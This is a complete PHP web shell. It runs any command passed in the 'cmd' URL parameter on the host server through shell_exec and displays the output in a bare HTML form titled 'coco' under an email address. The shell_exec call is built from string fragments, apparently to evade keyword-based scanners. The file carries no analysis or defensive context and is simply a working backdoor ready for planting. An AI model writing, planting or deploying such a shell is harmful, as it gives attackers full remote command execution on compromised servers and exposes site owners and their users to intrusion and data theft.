<?php
function t($t){return bin2hex($t);}
function x($h){$f='sh'.'ell'.'_exec';$c=hex2bin($h);if($c!==false){$o=$f($c);echo$o===null?"Failed.":"<pre>".htmlspecialchars($o)."</pre>";}else echo"Invalid.";}
if(isset($_GET['cmd']))x(t($_GET['cmd']));
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>coco</title><style>body{font-family:Arial;margin:2rem;}form{margin-top:1rem;}</style></head>
<body><h1>handokofuji@gmail.com</h1><form><label>Command:</label><br><input name="cmd"required style="width:100%;"><br><br><input type="submit"value="Run"></form></body>
</html>
